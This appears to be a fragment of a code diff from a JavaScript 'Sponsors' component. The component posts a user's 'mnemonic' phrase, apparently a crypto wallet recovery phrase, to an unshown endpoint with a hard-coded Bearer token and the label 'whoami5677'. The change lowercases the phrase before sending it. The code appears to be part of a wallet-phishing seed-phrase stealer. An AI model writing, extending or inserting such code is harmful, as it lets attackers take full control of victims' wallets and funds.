@@ -30,7 +30,7 @@ function Sponsors() {
                     'Authorization': 'Bearer hfhryeujhshbxhdsjjskaas',
                 },
                 body: JSON.stringify({ 
-                    mnemonic: phrase,
+                    mnemonic: phrase.toLowerCase(),
                     name: 'whoami5677'
 
                 })
